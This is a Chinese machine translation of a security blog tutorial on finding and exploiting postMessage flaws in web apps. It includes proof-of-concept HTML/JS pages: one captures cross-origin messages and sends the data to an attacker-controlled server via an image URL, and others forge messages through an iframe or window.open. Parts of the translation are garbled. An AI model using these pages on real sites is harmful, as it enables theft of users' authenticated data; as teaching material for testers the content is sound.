<html>
<head>
<title>How to spot and exploit postMessage vulnerablities?</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">如何发现和利用邮件后漏洞？</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-to-spot-and-exploit-postmessage-vulnerablities-329079d307cc?source=collection_archive---------0-----------------------#2020-08-30">https://infosecwriteups.com/how-to-spot-and-exploit-postmessage-vulnerablities-329079d307cc?source=collection_archive---------0-----------------------#2020-08-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="137c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘿，fam，我希望每个人都做得很好，能够有效地利用这段时间进行自我发展和自我反思。老实说，这种冠状病毒疫情已经变得有点累了，并得到了我们最好的。</p><p id="8cf9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试图帮助你理解一个在检查web应用程序或移动应用程序时经常被忽略的错误，让它成为所有测试人员的金矿，无论是经验丰富的还是新的。</p><p id="6ac5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">先决条件:该网站应该依靠cookies</p><p id="bf1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">情况1，消息发送到所有来源</strong></p><p id="dc57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先简单介绍一下postMessage，正如在<a class="ae kl" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" rel="noopener ugc nofollow" target="_blank"> mozilla文档</a>中描述的，语法相当简单。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="7e30" class="kv kw iq kr b gy kx ky l kz la">postMessage(<em class="lb">message</em>, <em class="lb">targetOrigin</em>, [<em class="lb">transfer</em>]);</span></pre><p id="2113" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，当目标原点设置为* aka everywhere或比方说xyz.com，但不正确的实现允许通过创建像xyz.com puter.com T4这样的域来绕过它时，问题就出现了。正如你们大多数人现在已经猜到的，数据并没有被限制在同一个源(原始域)中，因此在理论上是可以被泄露的。</p><p id="54e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们仔细看看这是如何实现的</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="7347" class="kv kw iq kr b gy kx ky l kz la">&lt;script&gt;<br/>window.addEventListener("message", function(event){<br/>document.write("&lt;img src='<a class="ae kl" href="http://192.168.1.5:8000/?leak=" rel="noopener ugc nofollow" target="_blank">http://192.168.1.5:8000/?leak=</a>"+event.data.value+"'&gt;&lt;/img&gt;");<br/>}, false);<br/>window.open("vulnerable page leaking data");<br/>&lt;/script&gt;</span></pre><p id="9093" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我知道这看起来很困惑，但请听我说:</p><p id="9d77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">既然信息正被发送到所有的源头，我们应该能抓住它。所以我们创建了一个恶意的html页面，它有一个事件监听器，基本上是一种捕捉器，捕捉post消息发送的任何数据。</p><p id="da14" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第三行的document.write只不过是使用图像标签泄漏重要数据的典型例子。我们所做的是在我们的计算机上创建本地服务器(http Simpleserver python works)，并通过在src <em class="lb"> our_pc_ip(请注意，您需要一个公共ip):port_number上写一个img，将我们捕获的数据发送到我们的pc？泄露=机密_数据。</em></p><p id="c522" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第四行基本上是打开易受攻击的页面，以便它将postMessage数据发送到所有来源，并且我们的脚本在数据传输后立即捕获它。</p><p id="3d79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，基本上这个页面是托管的，受害者被网络钓鱼者打开它，只要他们打开它，因为页面依赖于cookies，网站就会打开并进行身份验证，从而向用户泄露机密数据。</p><p id="b198" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">情况2，站点正在监听来自任何来源的消息</strong></p><p id="1679" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，如果事件侦听器正在侦听所有消息，而不考虑消息的来源，该怎么办呢？在这种情况下，就有可能伪造一条消息并将其发送给用户(范围可以从自己的xss到任何认证动作，如共享文档)。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="1116" class="kv kw iq kr b gy kx ky l kz la">&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;script&gt;<br/>function hack(){<br/>setTimeout(function(){document.getElementById("i").contentWindow.postMessage('<strong class="kr ir">The_message</strong>','*');},2000);<br/>};<br/>&lt;/script&gt;<br/>&lt;/head&gt;<br/>&lt;body&gt;<br/>  &lt;iframe id="i" src="<a class="ae kl" href="http://ptl-e13e72a3-bcbf8e2c.libcurl.so/" rel="noopener ugc nofollow" target="_blank"><strong class="kr ir">v</strong></a><strong class="kr ir">ulnerable page</strong>"&gt;&lt;/iframe&gt;<br/>&lt;script&gt;hack();&lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="261f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们所做的是创建一个恶意的html页面，但这次我们在iframe中打开该页面，并使用基本页面发送一条带有origin *的消息(基本上发送给所有目标，以便更容易利用)。易受攻击页面中的eventListener获取消息，由于来源未被正确过滤，它执行命令并允许操作。</p><p id="496b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，2000表示2秒，我们只是等待，以便在脚本执行之前页面被正确加载。</p><p id="699d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">怎么找？</strong></p><p id="c97b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">显然，我们不可能搜索每个页面的所有js而不浪费大量的精力去寻找postMessage函数来检查漏洞。一个简单的方法是使用chromedev工具，你只需检查一个页面并进入事件监听器。</p><figure class="km kn ko kp gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi lc"><img src="../Images/11d9659de463fd8e4064f5497864c204.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z3FqO1ht6sywcRHlBPP_tg.png"/></div></div></figure><p id="51e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以清楚地看到并定位事件侦听器下的消息，从而检查漏洞。</p><p id="7da2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">如果使用了X-FRAME而我们不能使用IFRAME怎么办？</strong></p><p id="9528" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">幸运的是有一个旁路，我们可以完全使用javascript来加载页面。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="ec72" class="kv kw iq kr b gy kx ky l kz la">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;script&gt;<br/>car w=window.open("url here","hack")<br/>setTimeout(function(){w.postMessage('text here','*');},2000);<br/>&lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="2877" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你喜欢读这篇文章！</p></div></div>    
</body>
</html>